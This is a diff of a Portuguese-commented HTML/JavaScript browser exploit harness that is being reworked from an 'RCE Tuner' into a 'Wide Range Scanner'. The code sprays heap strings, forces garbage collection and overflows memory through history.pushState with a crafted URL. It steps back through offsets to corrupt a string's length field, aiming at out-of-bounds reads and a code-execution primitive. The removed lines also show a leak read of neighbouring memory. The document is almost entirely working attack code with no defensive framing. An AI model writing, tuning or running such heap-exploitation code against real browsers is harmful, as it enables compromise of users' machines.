@@ -1,30 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>RCE Tuner: Length Corruption</title>
+    <title>Wide Range Scanner (-128 bytes)</title>
     <style>
-        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
-        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #0f0; background: #111; color: #fff; cursor: pointer; margin-bottom: 10px; }
+        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
+        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #00ff00; background: #1a1a1a; color: #fff; cursor: pointer; margin-bottom: 20px; }
         #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
-        .win { background-color: #0f0; color: #000; font-weight: bold; font-size: 1.6em; padding: 15px; border: 3px solid white; animation: blink 1s infinite; }
-        @keyframes blink { 50% { border-color: red; } }
+        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; border: 4px solid white; }
+        .hit { color: yellow; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <h1>RCE Tuner: Buscando o "Length"</h1>
-    <p>Você acertou os DADOS em 709.520. Agora vamos recuar para acertar o CABEÇALHO.</p>
+    <h1>Scanner de Amplo Espectro (-128 bytes)</h1>
+    <p>Procurando o campo Length em uma área maior antes dos dados.</p>
 
-    <button onclick="startTuning()">INICIAR SINTONIA FINA</button>
+    <button onclick="startWideScan()">INICIAR VARREDURA PROFUNDA</button>
     
     <div id="log">Pronto. Reinicie o console.</div>
 
     <script>
-        // O ponto onde acertamos os dados (Sucesso anterior)
-        const DATA_HIT_OFFSET = 709520;
+        // Ponto onde acertamos os DADOS (Referência)
+        const DATA_HIT = 709520;
         const OVERFLOW_AMT = 1024 * 64; 
 
-        // Configuração da Vítima (1MB TextDecoder - O que funcionou)
+        // Configuração da Vítima (1MB TextDecoder)
         const TARGET_SIZE = 1024 * 1024; 
         const PAYLOAD_SIZE = TARGET_SIZE - 24; 
 
@@ -32,43 +32,43 @@
 
         function log(msg, type) {
             const el = document.getElementById('log');
-            let cls = type === 'win' ? 'class="win"' : '';
+            let cls = type === 'win' ? 'class="win"' : (type === 'hit' ? 'class="hit"' : '');
             el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
             el.scrollTop = el.scrollHeight;
         }
 
         function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-        async function startTuning() {
-            // Vamos testar recuando de 4 em 4 bytes
-            // Offsets: -4, -8, -12, -16, -20, -24
-            const OFFSETS_TO_TRY = [4, 8, 12, 16, 20, 24, 28, 32];
-
-            for (let sub of OFFSETS_TO_TRY) {
-                let currentOffset = DATA_HIT_OFFSET - sub;
+        async function startWideScan() {
+            // Vamos recuar de 0 até 128 bytes, de 8 em 8.
+            // Isso cobre cabeçalhos grandes de alocadores como jemalloc/bmalloc.
+            
+            for (let offsetBack = 0; offsetBack <= 128; offsetBack += 8) {
+                let currentOffset = DATA_HIT - offsetBack;
                 
                 log(`------------------------------------------`);
-                log(`TESTANDO OFFSET: ${currentOffset} (Base - ${sub})`);
+                log(`TESTANDO OFFSET: ${currentOffset} (Recuo -${offsetBack})`);
                 
-                let result = await runAttempt(currentOffset);
-                
-                if (result) {
-                    return; // Paramos se acharmos o ouro
-                }
-                
-                // Limpeza agressiva entre tentativas
-                victims = null;
+                // Limpa memória anterior
+                victims = [];
                 await forceGC();
-                await sleep(200);
+                await sleep(100);
+
+                let result = await runTestAtOffset(currentOffset);
+                
+                if (result === "RCE") return; // Venceu
+                if (result === "DATA") {
+                    log(`Ainda em DADOS. Precisa recuar mais...`, 'hit');
+                }
             }
-            log("Fim da sintonia. Tente reiniciar e rodar de novo.");
+            log("Fim da varredura.");
         }
 
-        async function runAttempt(offset) {
+        async function runTestAtOffset(offset) {
             try {
-                // 1. Preparar Buffer (1MB Flat String)
+                // 1. Preparar Strings 1MB (8-bit)
                 let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
-                rawBuffer.fill(0x42); // 'B'
+                rawBuffer.fill(0x42); 
                 let decoder = new TextDecoder("utf-8");
                 let baseString = decoder.decode(rawBuffer);
 
@@ -83,41 +83,34 @@
                 for(let i=0; i<60; i+=2) victims[i] = null;
                 await forceGC();
 
-                // 4. Exploit com Offset Ajustado
+                // 4. Exploit
+                // Preenche até o offset atual e manda 0x01
                 let buffer = "A".repeat(offset);
                 buffer += "\x01".repeat(OVERFLOW_AMT);
                 
-                history.pushState({}, "tune_" + offset, "/" + buffer);
+                history.pushState({}, "scan_" + offset, "/" + buffer);
 
                 // 5. Checagem
                 for(let i=1; i<victims.length; i+=2) {
                     let s = victims[i];
                     if(!s) continue;
 
-                    // TRUQUE DO ERROR (Essencial para ler o Length real do Heap)
                     try {
                         let err = new Error(s);
                         let msg = err.message;
 
-                        // SUCESSO SUPREMO: Tamanho mudou?
+                        // CASO 1: LENGTH CORROMPIDO (VITÓRIA)
                         if (msg.length !== PAYLOAD_SIZE) {
-                            log(`!!! JACKPOT !!! LENGTH CORROMPIDO!`, 'win');
-                            log(`Offset Mágico: ${offset} (Base - ${DATA_HIT_OFFSET - offset})`, 'win');
-                            log(`Novo Tamanho: ${msg.length}`);
-                            
-                            // Prova de Leitura OOB (Out of Bounds)
-                            // Lendo memória que não nos pertence
-                            let leak = msg.charCodeAt(PAYLOAD_SIZE + 100);
-                            log(`Byte vazado do vizinho (+100): 0x${leak.toString(16)}`, 'win');
-                            
-                            alert("RCE UNLOCKED: MEMORY LEAK & WRITE!");
-                            return true;
+                            log(`!!! JACKPOT !!! Length alterado no recuo -${DATA_HIT - offset}`, 'win');
+                            log(`Novo Tamanho: ${msg.length}`, 'win');
+                            alert("RCE PRIMITIVE UNLOCKED!");
+                            return "RCE";
                         }
                         
-                        // Ainda só dados?
+                        // CASO 2: CONTEÚDO CORROMPIDO (DADOS)
+                        // Se o primeiro byte virou 1, ainda estamos na zona de dados
                         if (msg.charCodeAt(0) === 1) {
-                            log(`Aviso: Ainda acertando apenas DADOS em -${DATA_HIT_OFFSET - offset}. Precisa recuar mais.`);
-                            return false; // Continua tentando recuar
+                            return "DATA";
                         }
 
                     } catch(e) {}
@@ -126,12 +119,12 @@
             } catch(e) {
                 log("Erro (OOM): " + e.message);
             }
-            return false;
+            return "FAIL";
         }
 
         async function forceGC() {
             try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
-            return new Promise(r => setTimeout(r, 500));
+            return new Promise(r => setTimeout(r, 400));
         }
     </script>
 </body>
